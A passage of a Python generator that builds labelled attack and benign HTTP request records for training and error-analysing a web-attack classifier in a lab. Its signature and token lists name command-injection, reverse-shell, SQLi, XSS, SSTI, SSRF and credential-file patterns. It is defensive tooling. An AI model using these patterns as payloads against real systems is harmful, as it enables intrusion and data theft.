    "$(uname", "$(cat", "; wget", "; curl", "; nc ", "bash -i", "/dev/tcp/", "; python3",
    "; perl", "powershell", "{cat,", "; sleep", "; ping", "; sh -c", "crontab", "; env",
    "{{7*7}}", "${7*7}", "#{7*7}", "{$smarty", "{{config}}", "__class__", "java.lang.runtime",
    "#set(", "constructor.constructor", "%0d%0a", "%0a", "set-cookie:", "x-injected",
    "$gt", "$ne", "$regex", ")(uid=", "objectclass=*", "__schema", "<!entity", "<!doctype",
    "${jndi:", "id=2&id=3", "0x61646d616", "0x61646d696e", "//evil", "@evil", ".evil.",
    "data:text/html", "alg\":\"none", "eyjhbgcioijub25l", "eyjhbgcioijob05l", "kid",
    "system32", "\\\\", "dns.example", "staging.example",
]


def canonical_decoded(payload):
    s = payload
    for _ in range(3):
        nxt = unquote_plus(s)
        if nxt == s:
            break
        s = nxt
    s = (s.replace("\\u003c", "<").replace("\\u003e", ">").replace("\\u0027", "'")
         .replace("&lt;", "<").replace("&gt;", ">").replace("&#39;", "'").replace("&quot;", '"'))
    # Same order as parse_dataset_v4.canonical_key: strip comments, collapse whitespace, then
    # ${IFS}->space (NB-4: aligned with the generator's canonicaliser for exactness).
    s = re.sub(r"/\*.*?\*/", "", s)
    s = re.sub(r"\s+", " ", s)
    s = s.replace("${IFS}", " ")
    return s.strip().lower()


FAMILY_SIGNATURES = {
    "sql_injection": ("'1'='1", '"1"="1', "'x'='x", "or 1=1", "union select", "drop table",
                      "insert into", "sleep(", "pg_sleep", "benchmark(", "waitfor", "extractvalue",
                      "updatexml", "information_schema", "load_file", "procedure analyse",
                      "order by", "group by", "having", "' and ", "substring(", "ascii(",
                      "length(", "@@version", "convert(int", "/**/or/**/", "admin'--", "||(select",
                      "'||(select", "limit 1", "count(*)"),
    "xss": ("<script", "<svg", "<img", "<iframe", "<body", "<details", "<marquee", "<video",
            "<select", "<textarea", "<form action", "<meta http-equiv", "<object", "<math",
            "<bgsound", "<a href", "onerror=", "onload=", "onfocus=", "ontoggle=", "onmouseover=",
            "onstart=", "onpointerover=", "javascript:", "<%=", "eval(", "alert(", "atob(",
            "location.hash", "${alert", "<input"),
    "command_injection": ("; cat", "| id", "|| id", "&& ls", "`whoami`", "`uname", "`printenv`",
                          "$(uname", "$(cat", "cat /etc", "; wget", "; curl", "; nc ", "bash -i",
                          "/dev/tcp/", "; python3", "; perl", "powershell", "{cat,", "; sleep",
                          "; ping", "sh -c", "crontab", "; env", "; id >", "; tac", "head -n",
                          "& whoami", "& dir", "& type", "cat /etc/passwd", "cat/etc/passwd",
                          "getent", "brace_expand", "{cat,"),
    "path_file_access": ("../", "..\\", "/etc/passwd", "etc/passwd", "/etc/shadow", "/etc/hosts",
                         "/etc/hostname", "/etc/issue", "/var/log", "/proc/self", ".ssh/id_rsa",
                         ".bash_history", "win.ini", "config\\sam", "config/sam", "web.xml",
                         ".htpasswd", "/.env", ".git/config", "....//", "php://", "file://",
                         "data://", "expect://", "zip://", "boot.ini", "/dev/null", "..;/"),
    "ssrf": ("169.254.169.254", "100.100.100.200", "metadata.google", "metadata/instance",
             "127.0.0.1", "127.1", "[::1]", "2130706433", "0177.0.0.1", "0x7f000001", "10.0.0.1",
             "192.168", "172.16", "://metadata", ":6379", ":11211", ":3306", ":389", ":22",
             "gopher://", "dict://", "ldap://", "ftp://", "sftp://", "file://", "@169.254",
             "169.254.169.254#", "actuator", "ⓛocalhost", "ffff:127"),
    "ssti": ("{{", "${", "#{", "<%=", "{$smarty", "__class__", "#set(", "constructor.constructor",
             "7*7"),
    "open_redirect": ("//evil", "@evil", "\\evil", "data:text/html", "evil.example", "///evil"),
    "other_attack": ("%0d%0a", "\r\n", "set-cookie:", "x-injected", "$gt", "$ne", "$regex",
                     ")(uid=", "objectclass=*", "' or '1'='1", "__schema", "<!entity", "<!doctype",
                     "${jndi:", "id=2&id=3"),
    "jwt": ("eyj", "alg", "kid", "none"),
    "csrf": ("evil", "null", ".evil."),
}


def family_signature(family, decoded):
    return any(t in decoded for t in FAMILY_SIGNATURES.get(family, ()))


def oracle_check(case):
    decoded = canonical_decoded(case["payload"])
    if case["role"] == "attack":
        if not family_signature(case["family"], decoded):
            return f"attack payload does not match family signature: {case['case_id']} ({case['technique']})"
    else:
        hit = next((t for t in HARD_ATTACK_TOKENS if t in decoded), None)
        if hit is not None:
            return f"benign value contains a hard attack token {hit!r}: {case['case_id']}"
    return None


# ── assembly ─────────────────────────────────────────────────────────────────
def make_case(case_id, group_id, pair_id, role, family, technique, placement, value,
              oracle_reason, placement_variant=False):
    method, host, path, query, extra, body, ctype, visible = CARRIERS[placement](value)
    text = render(method, host, path, query, extra, body, ctype)
    return OrderedDict([
        ("case_id", case_id), ("schema", SCHEMA), ("group_id", group_id), ("pair_id", pair_id),
        ("role", role), ("label", "BLOCK" if role == "attack" else "ALLOW"),
        ("family", family), ("technique", technique), ("endpoint", path),
        ("placement", placement), ("host", host), ("method", method),
        ("payload", value), ("payload_canonical", canonical_decoded(value)),
        ("oracle_reason", oracle_reason), ("signal_location", SIGNAL_LOCATION[visible]),
        ("sink_type", sink_type(family, placement, role)),
        ("faithful_gateway", True), ("placement_variant", placement_variant),
        ("independent_attack_unit", role == "attack" and not placement_variant),
        ("d47_category", FAMILY_TO_D47[family] if role == "attack" else None),
        ("conclusion_family", family in CONCLUSION_FAMILIES),
        ("request_text", text), ("request_sha256", sha_text(text)),
    ])


def generate():
    cases, problems = [], []
    benign_cursor = defaultdict(int)

    def benign_twin(placement, pair_id, tag):
        pool = BENIGN_POOLS[placement]
        val = pool[benign_cursor[placement] % len(pool)]
        benign_cursor[placement] += 1
        return make_case("", f"benign_twin:{tag}", pair_id, "benign", "benign_twin",
                         f"twin_{tag}", placement, val,
                         f"legitimate {placement} value paired with {tag}")

    # independent attacks: one placement per payload, distributed across the family's endpoints
    for family, payloads in ATTACKS.items():
        placements = FAMILY_PLACEMENTS[family]
        for i, (technique, payload) in enumerate(payloads):
            placement = placements[i % len(placements)]
            tag = f"{family}:{technique}:{placement}"
            atk = make_case("", f"attack:{tag}", f"pair:{tag}", "attack", family, technique,
                            placement, payload,
                            f"canonical {family} attack attempt ({technique}) in {placement}; "
                            "malicious by construction (delivery/classification only, not exploitation)")
            cases.append(atk)
            cases.append(benign_twin(placement, f"pair:{tag}", tag))

    # placement-sensitivity sub-study (explicitly dependent; never independent)
    for family, technique, payload, placements in PLACEMENT_STUDY:
        for placement in placements:
            tag = f"{family}:{technique}:{placement}"
            cases.append(make_case("", f"placement_study:{tag}", f"pstudy:{tag}", "attack",
                                    family, technique, placement, payload,
                                    f"placement-sensitivity variant of {family}:{technique} "
                                    "(DEPENDENT; not an independent payload)",
                                    placement_variant=True))

    # standalone benign probes
    for kind, carrier, value in BENIGN_PROBES:
        cases.append(make_case("", f"benign_probe:{kind}:{carrier}", f"probe:{kind}", "benign",
                               "benign_probe", kind, carrier, value,
                               f"benign structure probe ({kind}) on {carrier}"))

    # stable case ids in final order
    counters = Counter()
    for c in cases:
        prefix = "ATK" if c["role"] == "attack" and not c["placement_variant"] else (
            "PST" if c["placement_variant"] else (
                "BPR" if c["family"] == "benign_probe" else "BEN"))
        counters[prefix] += 1
        c["case_id"] = f"{prefix}-{counters[prefix]:04d}"

    for c in cases:
        p = oracle_check(c)
        if p:
            problems.append(p)
    # independence: no two independent attack records may share a canonical payload within a family
    seen = {}
    for c in cases:
        if c["independent_attack_unit"]:
            key = (c["family"], c["payload_canonical"])
            if key in seen:
                problems.append(f"duplicate canonical payload within family: {c['case_id']} == {seen[key]}")
            else:
                seen[key] = c["case_id"]
    return cases, problems


# ── manifest with HONEST units ───────────────────────────────────────────────
NOT_TESTABLE = OrderedDict([
    ("http_request_smuggling", "NOT TESTABLE: CL.TE / TE.CL desync needs conflicting "
     "Content-Length / Transfer-Encoding framing; scripts/external/wire.to_wire rejects "
     "Transfer-Encoding and any Content-Length mismatch, and mitmproxy normalises framing"),
    ("host_header_injection", "NOT TESTABLE: the proxy connects to the request's Host, so a "
     "malicious external Host would leave the authorized lab; CRLF in a header does not survive "
     "rendering. Only benign Host variation among lab aliases is representable"),
    ("stateful_jwt_or_csrf_bypass", "NOT TESTABLE as an end-to-end bypass: the inert lab app "
     "validates no JWT and enforces no CSRF token, so attack SUCCESS is unobservable. Only the "
     "single-request REPRESENTATION is captured and its CLASSIFICATION studied; the Analyzer is "
     "blind to Authorization / Origin / Referer by construction (D44, JWT also D48)"),
])


def dependency_components(cases):
    """Connected components over 'same canonical payload OR same request text' among ALL cases —
    the honest dependency unit (reused benign texts and shared payloads collapse)."""
    parent = {}

    def find(x):
        parent.setdefault(x, x)
        while parent[x] != x:
            parent[x] = parent[parent[x]]
            x = parent[x]
        return x

    def union(a, b):
        parent[find(a)] = find(b)

    for c in cases:
        cid = "case:" + c["case_id"]
        find(cid)
        union(cid, "txt:" + c["request_sha256"])
        if c["role"] == "attack":
            # key by canonical payload STRING (not family): the stated relation is "same
            # canonical payload OR same text", so a string reused across families collapses.
            union(cid, "pay:" + c["payload_canonical"])
    roots = {find("case:" + c["case_id"]) for c in cases}
    return len(roots)


def build_manifest(cases):
    attack = [c for c in cases if c["role"] == "attack"]
    independent = [c for c in attack if c["independent_attack_unit"]]
    pvariant = [c for c in attack if c["placement_variant"]]
    benign = [c for c in cases if c["role"] == "benign"]
    twins = [c for c in benign if c["family"] == "benign_twin"]
    probes = [c for c in benign if c["family"] == "benign_probe"]

    def ut(xs):
        return len({c["request_text"] for c in xs})

    indep_by_family = Counter(c["family"] for c in independent)
    indep_payloads_by_family = {f: len({c["payload_canonical"] for c in independent if c["family"] == f})
                                for f in indep_by_family}
    pairs = defaultdict(set)
    for c in cases:
        if c["pair_id"].startswith("pair:"):
            pairs[c["pair_id"]].add(c["role"])
    complete_pairs = sum(1 for r in pairs.values() if r == {"attack", "benign"})

    return OrderedDict([
        ("schema", SCHEMA),
        ("role", "DEVELOPMENT / ERROR-ANALYSIS (D37, D45); not an evaluation or external test"),
        ("revision", 1),
        ("units", OrderedDict([
            ("total_request_records", len(cases)),
            ("unique_request_texts", ut(cases)),
            ("attack_records", len(attack)),
            ("independent_attack_records (per-family distinct canonical payload, one placement each)",
             len(independent)),
            ("distinct_family_canonical_pairs (the independence unit)",
             len({(c["family"], c["payload_canonical"]) for c in independent})),
            ("distinct_canonical_payload_strings",
             len({c["payload_canonical"] for c in independent})),
            ("cross_family_shared_canonical_strings",
             sum(1 for s in {c["payload_canonical"] for c in independent}
                 if len({c["family"] for c in independent if c["payload_canonical"] == s}) > 1)),
            ("placement_sensitivity_variant_records (DEPENDENT, not independent)", len(pvariant)),
            ("distinct_attack_techniques", len({(c["family"], c["technique"]) for c in attack})),
            ("benign_records", len(benign)),
            ("benign_twin_records", len(twins)),
            ("unique_benign_twin_texts", ut(twins)),
            ("benign_probe_records", len(probes)),
            ("unique_benign_probe_texts", ut(probes)),
            ("unique_benign_texts_total", ut(benign)),
            ("complete_attack_benign_pairs", complete_pairs),
            ("dependency_components (same canonical payload OR same text)",
             dependency_components(cases)),
        ])),
        ("independent_attack_payloads_by_family", OrderedDict(sorted(indep_payloads_by_family.items()))),
        ("distinct_techniques_by_family",
         OrderedDict(sorted((f, len({c["technique"] for c in attack if c["family"] == f}))
                            for f in {c["family"] for c in attack}))),
        ("conclusion_families", list(CONCLUSION_FAMILIES)),
        ("conclusion_family_independent_payloads",
         OrderedDict((f, indep_payloads_by_family.get(f, 0)) for f in CONCLUSION_FAMILIES)),
        ("conclusion_family_meets_D18_30_independent",
         OrderedDict((f, indep_payloads_by_family.get(f, 0) >= MIN_INDEPENDENT)
                     for f in CONCLUSION_FAMILIES)),
        ("conclusion_family_sink_coverage",
         OrderedDict((f, {"natural_sink": sum(1 for c in independent if c["family"] == f
                                              and c["sink_type"] == "natural_sink"),
                          "generic_carrier": sum(1 for c in independent if c["family"] == f
                                                 and c["sink_type"] == "generic_carrier")})
                     for f in CONCLUSION_FAMILIES)),
        ("sink_type_note",
         "natural_sink = field role is a plausible injection point for the family (query/filter/"
         "auth for SQLi, reflected field for XSS, /static for traversal, url/webhook for SSRF); "
         "command_injection has NO natural sink in the inert lab; a V4 ALLOW on a generic_carrier "
         "token is delivery/classification context, never an operational detection failure"),
        ("independence_criterion",
         f">= {MIN_INDEPENDENT} DISTINCT CANONICAL attack payloads per family (D18); placement "
         "variants and reused benign texts are NEVER counted as independent"),
        ("cases_by_family", OrderedDict(sorted(Counter(c["family"] for c in cases).items()))),
        ("hosts", sorted({c["host"] for c in cases})),
        ("placements", sorted({c["placement"] for c in cases})),
        ("not_testable", NOT_TESTABLE),
        ("cases_sha256", None),
    ])


def write_jsonl(path, rows):
    with open(path, "x", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")


def ha_sha(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def cmd_generate(args):
    cases, problems = generate()
    if os.path.exists(args.out):
        raise SystemExit(f"REFUSING to overwrite {args.out}")
    write_jsonl(args.out, cases)
    man = build_manifest(cases)
    man["cases_sha256"] = ha_sha(args.out)
    if args.manifest:
        if os.path.exists(args.manifest):
            raise SystemExit(f"REFUSING to overwrite {args.manifest}")
        with open(args.manifest, "x", encoding="utf-8") as f:
            f.write(json.dumps(man, indent=2, ensure_ascii=False) + "\n")
    u = man["units"]
    print(f"generated {u['total_request_records']} records "
          f"({u['attack_records']} attack / {u['benign_records']} benign); "
          f"unique texts {u['unique_request_texts']}; "
          f"independent attack payloads {u['distinct_canonical_attack_payloads']}; "
          f"dependency components {u['dependency_components (same canonical payload OR same text)']}; "
          f"problems: {problems or 'none'}")
    for f in CONCLUSION_FAMILIES:
        print(f"  {f}: {man['conclusion_family_independent_payloads'][f]} independent payloads, "
              f">=30: {man['conclusion_family_meets_D18_30_independent'][f]}")
    print(f"  unique benign twin texts: {u['unique_benign_twin_texts']} "
          f"(from {u['benign_twin_records']} twin records)")
    return 1 if problems else 0


def cmd_manifest(args):
    cases = [json.loads(l) for l in open(args.cases, encoding="utf-8") if l.strip()]
    man = build_manifest(cases)
    man["cases_sha256"] = ha_sha(args.cases)
    print(json.dumps(man, indent=2, ensure_ascii=False))
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.strip().split("\n")[0])
    sub = ap.add_subparsers(dest="cmd", required=True)
    g = sub.add_parser("generate")
    g.add_argument("--out", required=True)
    g.add_argument("--manifest", default=None)
    m = sub.add_parser("manifest")
    m.add_argument("--cases", required=True)
    args = ap.parse_args(argv)
    return {"generate": cmd_generate, "manifest": cmd_manifest}[args.cmd](args)


if __name__ == "__main__":
    sys.exit(main())
